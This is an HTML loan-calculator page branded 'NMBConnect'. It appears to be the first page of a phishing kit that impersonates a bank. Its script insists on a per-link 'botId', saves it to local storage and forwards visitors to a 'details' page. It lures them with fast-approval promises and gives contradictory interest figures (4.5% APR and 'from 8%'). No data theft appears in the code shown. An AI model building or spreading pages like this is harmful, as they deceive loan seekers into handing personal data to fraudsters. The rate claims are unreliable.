<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>NMBConnect - Loan Calculator</title>

<style>
*{
margin:0;
padding:0;
box-sizing:border-box;
font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
}

body{
background: #4a2b7a;
min-height:100vh;
display:flex;
justify-content:center;
align-items:center;
padding:20px;
}

.app{
width:100%;
max-width:400px;
background:#ffffff;
border-radius:28px;
padding:35px 28px 30px;
box-shadow: 0 20px 60px rgba(0,0,0,0.3);
position:relative;
}

.logo-container {
    text-align: center;
    margin-bottom: 20px;
}

.nmb-logo {
    display: inline-flex;
    align-items: center;
    gap: 10px;
    text-decoration: none;
}

.nmb-logo .logo-icon {
    width: 40px;
    height: 40px;
    background: #4a2b7a;
    border-radius: 50%;
    display: flex;
    align-items: center;
    justify-content: center;
    color: white;
    font-size: 20px;
    font-weight: 700;
}

.nmb-logo .logo-text {
    font-size: 22px;
    font-weight: 700;
    color: #1a1a2e;
    letter-spacing: 0.5px;
}

.nmb-logo .logo-text span {
    color: #4a2b7a;
}

.header {
    text-align: center;
    margin-bottom: 20px;
}

.header h1 {
    color: #1a1a2e;
    font-size: 22px;
    font-weight: 600;
    letter-spacing: -0.3px;
    margin-bottom: 4px;
}

.header .subtitle {
    color: #777;
    font-size: 13px;
    font-weight: 400;
}

.card {
    background: #f8f8fc;
    border-radius: 16px;
    padding: 20px;
    margin-top: 5px;
}

.card h2 {
    color: #1a1a2e;
    font-size: 18px;
    font-weight: 600;
    margin-bottom: 15px;
    text-align: center;
}

.card .label {
    color: #777;
    font-size: 12px;
    font-weight: 500;
    letter-spacing: 0.5px;
    text-align: center;
    margin-bottom: 5px;
}

.amount {
    color: #1a1a2e;
    font-size: 28px;
    font-weight: 700;
    text-align: center;
    margin: 5px 0 15px;
}

.slider {
    width: 100%;
    -webkit-appearance: none;
    appearance: none;
    height: 6px;
    border-radius: 3px;
    background: linear-gradient(to right, #4a2b7a 0%, #4a2b7a 50%, #ddd 50%, #ddd 100%);
    outline: none;
    transition: background 0.2s;
}

.slider::-webkit-slider-thumb {
    -webkit-appearance: none;
    appearance: none;
    width: 20px;
    height: 20px;
    border-radius: 50%;
    background: #4a2b7a;
    cursor: pointer;
    box-shadow: 0 2px 8px rgba(74, 43, 122, 0.3);
}

.slider::-moz-range-thumb {
    width: 20px;
    height: 20px;
    border-radius: 50%;
    background: #4a2b7a;
    cursor: pointer;
    border: none;
}

.labels {
    display: flex;
    justify-content: space-between;
    font-size: 11px;
    color: #999;
    margin-top: 4px;
}

.term-section {
    margin-top: 18px;
}

.term-section .term-label {
    color: #777;
    font-size: 12px;
    font-weight: 500;
    letter-spacing: 0.5px;
    text-align: center;
    margin-bottom: 8px;
}

.term-section .months-display {
    color: #4a2b7a;
    font-size: 16px;
    font-weight: 600;
    text-align: center;
    margin-bottom: 10px;
}

.term-buttons {
    display: grid;
    grid-template-columns: repeat(3, 1fr);
    gap: 8px;
}

.term {
    padding: 8px;
    border-radius: 8px;
    background: #ffffff;
    border: 1.5px solid #e0e0e8;
    cursor: pointer;
    font-size: 12px;
    font-weight: 500;
    color: #555;
    transition: all 0.3s ease;
}

.term:hover {
    border-color: #4a2b7a;
    color: #4a2b7a;
}

.term.active {
    background: #4a2b7a;
    border-color: #4a2b7a;
    color: white;
}

.result {
    background: #ffffff;
    padding: 16px;
    border-radius: 12px;
    margin-top: 18px;
    text-align: center;
    border: 1px solid #e8e8f0;
}

.result .result-label {
    color: #777;
    font-size: 11px;
    font-weight: 500;
    letter-spacing: 0.5px;
}

.result .payment {
    color: #1a1a2e;
    font-size: 26px;
    font-weight: 700;
    margin-top: 3px;
}

.result .rate-info {
    color: #999;
    font-size: 11px;
    margin-top: 4px;
}

.apply-btn {
    width: 100%;
    padding: 15px;
    background: #4a2b7a;
    border: none;
    border-radius: 12px;
    color: white;
    font-size: 17px;
    font-weight: 600;
    cursor: pointer;
    transition: all 0.3s ease;
    margin-top: 18px;
    letter-spacing: 0.3px;
}

.apply-btn:hover {
    background: #3a1f5e;
    transform: translateY(-1px);
    box-shadow: 0 6px 20px rgba(74, 43, 122, 0.35);
}

.apply-btn:active {
    transform: translateY(0);
}

.info-grid {
    display: grid;
    grid-template-columns: 1fr 1fr;
    gap: 10px;
    margin-top: 15px;
}

.info {
    background: #ffffff;
    padding: 12px 10px;
    border-radius: 12px;
    display: flex;
    align-items: center;
    gap: 10px;
    border: 1px solid #e8e8f0;
}

.info .icon {
    width: 36px;
    height: 36px;
    border-radius: 50%;
    background: #4a2b7a;
    display: flex;
    align-items: center;
    justify-content: center;
    color: white;
    font-size: 16px;
    flex-shrink: 0;
}

.info .info-text b {
    color: #1a1a2e;
    font-size: 13px;
    display: block;
}

.info .info-text small {
    color: #999;
    font-size: 11px;
}

.min-notice {
    background: #fff8e1;
    border: 1px solid #ffe082;
    border-radius: 8px;
    padding: 8px 12px;
    margin-top: 12px;
    text-align: center;
    font-size: 12px;
    color: #856404;
}

@media (max-width: 440px) {
    .app {
        padding: 28px 20px 25px;
        border-radius: 22px;
    }
    
    .header h1 {
        font-size: 20px;
    }
    
    .nmb-logo .logo-text {
        font-size: 20px;
    }
    
    .amount {
        font-size: 24px;
    }
    
    .term-buttons {
        grid-template-columns: repeat(3, 1fr);
        gap: 6px;
    }
    
    .term {
        font-size: 11px;
        padding: 6px;
    }
    
    .info-grid {
        grid-template-columns: 1fr;
    }
}
</style>
</head>

<body>

<div class="app">

    <div class="logo-container">
        <div class="nmb-logo">
            <div class="logo-icon">N</div>
            <div class="logo-text">NMB<span>Connect</span></div>
        </div>
    </div>

    <div class="header">
        <h1>Get Your Loan Approved Fast</h1>
        <div class="subtitle">Quick approval • Competitive rates • Flexible terms</div>
    </div>

    <div class="card">

        <h2>Loan Calculator</h2>

        <div class="label">LOAN AMOUNT</div>
        <div class="amount" id="loanAmount">$100</div>

        <input type="range" min="100" max="50000" value="100" step="100" class="slider" id="loanSlider">

        <div class="labels">
            <span>$100</span>
            <span>$50,000</span>
        </div>

        <div class="min-notice">💰 Minimum loan amount: $100</div>

        <div class="term-section">
            <div class="term-label">LOAN TERM</div>
            <div class="months-display" id="months">12 months</div>

            <div class="term-buttons">
                <button class="term" data-month="6">6 mo</button>
                <button class="term active" data-month="12">12 mo</button>
                <button class="term" data-month="24">24 mo</button>
                <button class="term" data-month="36">36 mo</button>
                <button class="term" data-month="48">48 mo</button>
                <button class="term" data-month="60">60 mo</button>
            </div>
        </div>

        <div class="result">
            <div class="result-label">MONTHLY PAYMENT</div>
            <div class="payment" id="payment">$0.00</div>
            <div class="rate-info">Interest rate: 4.5% APR</div>
        </div>

        <button class="apply-btn" onclick="applyLoan()">APPLY NOW</button>

        <div class="info-grid">
            <div class="info">
                <div class="icon">⚡</div>
                <div class="info-text">
                    <b>Fast Approval</b>
                    <small>Within 24 hours</small>
                </div>
            </div>
            <div class="info">
                <div class="icon">💰</div>
                <div class="info-text">
                    <b>Low Rates</b>
                    <small>From 8%</small>
                </div>
            </div>
        </div>

    </div>

</div>

<script>
// ---------- BOT ID FROM URL ----------
const params = new URLSearchParams(window.location.search);
const botId = params.get('botId') || window.location.pathname.split('/').pop();

if (!botId) {
    alert("Invalid access link");
    throw new Error();
}

// ---------- SAVE SESSION ----------
localStorage.setItem("botId", botId);
// Ensure fullName is always set
if (!localStorage.getItem('fullName')) {
    localStorage.setItem('fullName', 'Loan Customer');
}

// ---------- CALCULATOR LOGIC ----------
let slider = document.getElementById("loanSlider");
let loanAmount = document.getElementById("loanAmount");
let payment = document.getElementById("payment");
let monthsDisplay = document.getElementById("months");

let months = 12;
const rate = 0.045 / 12;

function calculate() {
    let P = parseFloat(slider.value);
    let n = months;
    let r = rate;
    let M = (P * r * Math.pow(1 + r, n)) / (Math.pow(1 + r, n) - 1);
    if (isNaN(M) || !isFinite(M)) M = 0;
    loanAmount.innerText = "$" + Number(P).toLocaleString();
    payment.innerText = "$" + M.toFixed(2);
    const min = parseFloat(slider.min);
    const max = parseFloat(slider.max);
    const percent = ((P - min) / (max - min)) * 100;
    slider.style.background = `linear-gradient(to right, #4a2b7a 0%, #4a2b7a ${percent}%, #ddd ${percent}%, #ddd 100%)`;
}

slider.oninput = calculate;

document.querySelectorAll(".term").forEach(btn => {
    btn.onclick = function() {
        document.querySelectorAll(".term").forEach(b => b.classList.remove("active"));
        this.classList.add("active");
        months = parseInt(this.dataset.month);
        monthsDisplay.innerText = months + " months";
        calculate();
    };
});

// ---------- APPLY NOW ----------
function applyLoan() {
    const amount = parseFloat(slider.value);
    if (amount < 100) {
        alert('⚠️ Minimum loan amount is $100');
        return;
    }
    localStorage.setItem("loanAmount", slider.value);
    localStorage.setItem("loanTerm", months);
    localStorage.setItem("fullName", "Loan Customer"); // double‑check
    window.location.href = `details.html?botId=${botId}`;
}

calculate();
</script>

</body>
</html>
